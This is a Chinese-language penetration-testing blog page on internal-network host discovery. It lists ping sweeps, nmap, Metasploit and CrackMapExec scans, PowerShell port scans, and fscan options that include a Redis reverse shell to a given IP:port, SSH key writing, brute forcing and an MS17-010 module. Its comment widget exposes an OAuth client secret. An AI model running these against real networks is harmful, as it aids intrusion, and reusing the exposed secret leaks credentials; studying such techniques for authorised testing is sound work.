@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="zh-Hans" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="YSec" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="与YSec共同进步" />
+  
+  
+  
+  <title>
+    
+      内网渗透-0x04 主机发现 
+      
+      
+      |
+    
+     YSec
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">YSec</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">内网渗透-0x04 主机发现</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-12-04 22:24:51
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                    <b>#</b> 内网渗透
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                    #内网渗透
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/" title="主机发现">
+                    #主机发现
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>主机发现可以分三种情况：</p>
+<ol>
+<li>拿到了<code>Webshell</code>，我们可以使用系统命令或者上传工具进行探测</li>
+<li>主机在目标内网，已经搭建隧道，可以使用<code>Proxychains</code>+<code>Nmap</code></li>
+<li>拿到一个反弹的<code>shell</code>，可以考虑<code>MSF</code></li>
+</ol>
+<p>网络传输协议包括ARP、ICMP、SMB、UDP、SNMP等，我们根据实际进行TCP、UDP、ICMP扫描以及其他协议扫描</p>
+<h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><h3 id="PING"><a href="#PING" class="headerlink" title="PING"></a>PING</h3><p>WIN：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 直接显示</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /l %i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">255</span>) <span class="keyword">do</span> @<span class="built_in">ping</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%i -w <span class="number">1</span> -n <span class="number">1</span>|<span class="built_in">find</span> /i &quot;ttl=&quot;</span><br><span class="line"></span><br><span class="line">// 无显示，写文件，注意权限问题，避开C盘，失败的写进errorPing.txt，成功successPing.txt</span><br><span class="line"></span><br><span class="line">@<span class="keyword">for</span> /l %i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">255</span>) <span class="keyword">do</span> @<span class="built_in">ping</span> -n <span class="number">1</span> -w <span class="number">40</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%i &amp; <span class="keyword">if</span> <span class="keyword">errorlevel</span> <span class="number">1</span> (<span class="built_in">echo</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%i &gt;&gt; e:/errorPing.txt) <span class="keyword">else</span> (<span class="built_in">echo</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%i &gt;&gt; e:/successPing.txt)</span><br></pre></td></tr></table></figure>
+
+<p>Linux:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 直接显示</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> $( <span class="built_in">seq</span> 1 255);<span class="keyword">do</span> ping -c 1 192.168.1.|grep <span class="string">&quot;ttl&quot;</span>|awk -F <span class="string">&quot;[ :]+&quot;</span> <span class="string">&#x27;&#123;print $4&#125;&#x27;</span>; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">// 写文件到/tmp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..255&#125;; <span class="keyword">do</span> ping -c 1 -W 40 192.168.1.<span class="variable">$i</span> &amp;&gt; /dev/null; <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;192.168.1.<span class="variable">$i</span>&quot;</span> &gt;&gt; /tmp/errorPing.txt; <span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">&quot;192.168.1.<span class="variable">$i</span>&quot;</span> &gt;&gt; /tmp/successPing.txt; <span class="keyword">fi</span>; <span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap ‐sP ‐PI 192.168.1.0/24 ‐T4</span><br><span class="line"></span><br><span class="line">nmap ‐sn ‐PE ‐T4 192.168.1.0/24</span><br><span class="line"></span><br><span class="line">// sP：表示 Ping 扫描。这个选项用于扫描一个网络段中的主机，检查它们是否在线。此命令不会进行端口扫描，仅确定哪些主机是活动的。</span><br><span class="line">// 需要注意的是，在 nmap 的较新版本中，-sP 已被弃用，取而代之的是 -sn（主机发现扫描）。</span><br><span class="line">//PI：表示使用 ICMP Echo 请求 来发现主机。nmap 发送一个标准的 ICMP Echo 请求来测试目标主机是否响应（即是否在线）。这个选项表示只使用 ICMP 请求来检测主机，而不使用 ARP 请求或其他协议</span><br><span class="line">//PE：表示使用 ICMP Echo 请求（Ping）。它告诉 nmap 发送 ICMP Echo 请求到目标主机来确认主机是否在线。类似于 -PI，但它不完全相同：-PE 侧重于 ICMP Echo 请求，而 -PI 在某些 nmap 版本中可能需要额外的指定</span><br></pre></td></tr></table></figure>
+
+<h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><p>UDP协议是无连接的，无需连接就能进行数据包发送</p>
+<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_probe</span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line"></span><br><span class="line">// udp_probe用于扫描指定目标上的 UDP 端口，通过发送UDP请求并等待响应来确定端口是否开放</span><br><span class="line">// udp_sweep不会等待目标主机返回响应，而是发送 UDP 请求 到指定范围的端口，并检查目标主机是否返回 ICMP 错误消息或其他反馈信息（有时可能并没有反馈)</span><br><span class="line">// 所以一个适用于单端口的多IP扫描，一个适用于多端口多IP扫描，下面是具体使用实例</span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">msf auxiliary(udp_probe) &gt; set RHOSTS 192.168.1.0/24</span><br><span class="line">msf auxiliary(udp_probe) &gt; set PORTS 53</span><br><span class="line">msf auxiliary(udp_probe) &gt; run</span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line">msf auxiliary(udp_sweep) &gt; set RHOSTS 192.168.1.0/24</span><br><span class="line">msf auxiliary(udp_sweep) &gt; set PORTS 1-1024</span><br><span class="line">msf auxiliary(udp_sweep) &gt; run</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nmap-1"><a href="#Nmap-1" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -T5 -sV --max-retries 1 192.168.1.2 -p 500</span><br><span class="line"></span><br><span class="line">// -sU: 进行UDP扫描</span><br><span class="line">// -T后面跟的是一个数字，表示 扫描时间模板。T5 是最快速的扫描模板，适合于高效、快速的扫描，适用于网络较快、目标不容易被防火墙阻挡的情况</span><br><span class="line">// -sV: 检测服务版本</span><br><span class="line">// --max-retries: 最大重试次数</span><br></pre></td></tr></table></figure>
+
+<h3 id="unicornscan"><a href="#unicornscan" class="headerlink" title="unicornscan"></a>unicornscan</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unicornscan -mU 192.168.1.2</span><br><span class="line"></span><br><span class="line">// 该工具kali自带</span><br><span class="line">// mU表示进行udp扫描</span><br></pre></td></tr></table></figure>
+
+<h2 id="NetBios"><a href="#NetBios" class="headerlink" title="NetBios"></a>NetBios</h2><p><code>NetBIOS</code>协议是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的统一的命令集，作用是为了给局域网提供网络以及其他特殊功能，几乎所有的局域网都是在<code>NetBIOS</code>协议的基础上工作的</p>
+<h3 id="Nmap-2"><a href="#Nmap-2" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4</span><br><span class="line"></span><br><span class="line">// 此时依然是UDP扫描，但是多了nbstat.nse脚本，收集关于 NetBIOS 的信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="MSF-1"><a href="#MSF-1" class="headerlink" title="MSF"></a>MSF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/netbios/nbname</span><br><span class="line"></span><br><span class="line">// 使用options查看参数设置就行</span><br></pre></td></tr></table></figure>
+
+<h3 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// windows</span><br><span class="line">nbtscan-1.0.35.exe -m 192.168.3.0/24</span><br><span class="line"></span><br><span class="line">// linux</span><br><span class="line">// kali自带</span><br><span class="line">nbtscan -r 192.168.3.0/24</span><br></pre></td></tr></table></figure>
+
+<h2 id="APR"><a href="#APR" class="headerlink" title="APR"></a>APR</h2><h3 id="Nmap-3"><a href="#Nmap-3" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PR 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">// 表示使用 ARP Ping来进行主机发现。ARP Ping 是一种基于局域网内的 MAC 地址解析协议（ARP）的扫描方法</span><br><span class="line">// 当使用 -PR 时，nmap 会发送 ARP 请求到目标子网中的每个主机。如果目标主机在线且在同一局域网内，它会响应 ARP 请求</span><br></pre></td></tr></table></figure>
+
+<h3 id="MSF-2"><a href="#MSF-2" class="headerlink" title="MSF"></a>MSF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br></pre></td></tr></table></figure>
+
+<h3 id="netdicover"><a href="#netdicover" class="headerlink" title="netdicover"></a>netdicover</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.2.0/24 -i eth0</span><br><span class="line"></span><br><span class="line">// linux自带</span><br><span class="line">// -i 网卡名</span><br></pre></td></tr></table></figure>
+
+<h3 id="arp-scan"><a href="#arp-scan" class="headerlink" title="arp-scan"></a>arp-scan</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arp-scan --interface=eth0 --localnet</span><br><span class="line"></span><br><span class="line">// kali自带</span><br><span class="line">// 实战中需要上传到靶机</span><br></pre></td></tr></table></figure>
+
+<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><h3 id="MSF-3"><a href="#MSF-3" class="headerlink" title="MSF"></a>MSF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nmap-4"><a href="#Nmap-4" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sS --script smb-enum-shares.nse  -p 445 192.168.3.0/24</span><br></pre></td></tr></table></figure>
+
+<h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /l %a in (1,1,254) do start /min /low telnet 192.168.3.%a 445</span><br></pre></td></tr></table></figure>
+
+<h3 id="CME"><a href="#CME" class="headerlink" title="CME"></a>CME</h3><p>CrackMapExec（CME）是一款后渗透利用工具，可帮助自动化大型活动目录(AD)网络安全评估任务。其缔造者<a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r">@byt3bl33d3r</a>称，该工具的生存概念是，“利用AD内置功能&#x2F;协议达成其功能，并规避大多数终端防护&#x2F;IDS&#x2F;IPS解决方案。”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 192.168.3.0/24</span><br></pre></td></tr></table></figure>
+
+<h2 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h2><p>是一种基于应用层的网络协议，主要用于在 IP 网络中管理和监控设备。SNMP 使网络管理员能够通过网络对路由器、交换机、服务器、打印机等设备进行监控、配置和管理。</p>
+<h3 id="Nmap-5"><a href="#Nmap-5" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --script snmp-brute 192.168.3.0/24 -T4</span><br></pre></td></tr></table></figure>
+
+<h3 id="MSF-4"><a href="#MSF-4" class="headerlink" title="MSF"></a>MSF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/snmp/snmp_enum</span><br></pre></td></tr></table></figure>
+
+<h2 id="常见工具"><a href="#常见工具" class="headerlink" title="常见工具"></a>常见工具</h2><h3 id="Fscan"><a href="#Fscan" class="headerlink" title="Fscan"></a>Fscan</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 192.168.1.1/24</span><br><span class="line">fscan.exe -h 192.168.1.1/24  (默认使用全部模块)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写私钥)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)</span><br></pre></td></tr></table></figure>
+
+<h3 id="powershell脚本"><a href="#powershell脚本" class="headerlink" title="powershell脚本"></a>powershell脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/nettitude/PoshC2_Old/blob/master/Modules/Invoke-Arpscan.ps1</span><br><span class="line">https://github.com/dwj7738/My-Powershell-Repository/blob/master/Scripts/Invoke-TSPingSweep.ps1</span><br><span class="line"></span><br><span class="line">// Invoke-Arpscan.ps1</span><br><span class="line">powershell.exe -exec bypass -Command &quot;Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot;</span><br><span class="line"></span><br><span class="line">// Invoke-TSPingSweep.ps1</span><br><span class="line">powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.1.0 -EndAddress 192.168.1.255&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 多ip单端口</span><br><span class="line">powershell foreach ($ip in 1..20) &#123;Test-NetConnection -Port 80 -InformationLevel &quot;Detailed&quot; 192.168.3.$ip&#125;</span><br><span class="line"></span><br><span class="line">// 单ip多端口</span><br><span class="line">1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.3.2&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null</span><br><span class="line"></span><br><span class="line">// 多ip多端口</span><br><span class="line">1..20 | % &#123; $a = $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.3.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="PTscan"><a href="#PTscan" class="headerlink" title="PTscan"></a>PTscan</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Usage: python PTscan.py &#123;-f /xxx/xxx.txt or -h 192.168.1&#125; [-p 21,80,3306]  [-m 50] [-t 10] [-n] [-b] [-r]</span><br><span class="line"></span><br><span class="line">-f  指定扫描目标文件，文件格式如list.txt所示，同时支持IP和URL</span><br><span class="line">-h  指定扫描IP或IP段，支持段扫描，如192.168.1 即为扫描C段，192.168 即为扫描B段</span><br><span class="line">-p  指定扫描端口，缺省使用程序中的配置端口</span><br><span class="line">-m  指定线程数</span><br><span class="line">-t  指定timeout</span><br><span class="line">-n  不进行ping操作，直接扫描</span><br><span class="line">-b  开启Banner识别</span><br><span class="line">-r  ReverseIP</span><br></pre></td></tr></table></figure>
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2024/12/04/0x03%20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-12-04 22:24:51
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                        <b>#</b> 内网渗透
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                        #内网渗透
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/" title="主机发现">
+                        #主机发现
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2024/12/04/0x05%20%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ICMP"><span class="toc-text">ICMP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PING"><span class="toc-text">PING</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-text">Nmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UDP"><span class="toc-text">UDP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF"><span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-1"><span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unicornscan"><span class="toc-text">unicornscan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NetBios"><span class="toc-text">NetBios</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-2"><span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-1"><span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nbtscan"><span class="toc-text">nbtscan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#APR"><span class="toc-text">APR</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-3"><span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-2"><span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#netdicover"><span class="toc-text">netdicover</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arp-scan"><span class="toc-text">arp-scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB"><span class="toc-text">SMB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-3"><span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-4"><span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD"><span class="toc-text">CMD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CME"><span class="toc-text">CME</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SNMP"><span class="toc-text">SNMP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-5"><span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-4"><span class="toc-text">MSF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7"><span class="toc-text">常见工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fscan"><span class="toc-text">Fscan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E8%84%9A%E6%9C%AC"><span class="toc-text">powershell脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTscan"><span class="toc-text">PTscan</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <div id="gitalk-container"></div>
+
+  <script>
+    function loadGitalkSuc() {
+      const gitalk = new Gitalk({
+        clientID: 'Ov23licpPbk56RG2QlZ9',
+        clientSecret: '8c17dc4d2de10cbb8846fbd6a9276cc3dc42f9e9',
+        repo: 'Yllxx03.github.io',
+        owner: 'Yllxx03',
+        admin: ['Yllxx03'],
+        id: location.pathname,
+        distractionFreeMode: false
+      })
+
+      gitalk.render('gitalk-container')
+    }
+  </script>
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
+  
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
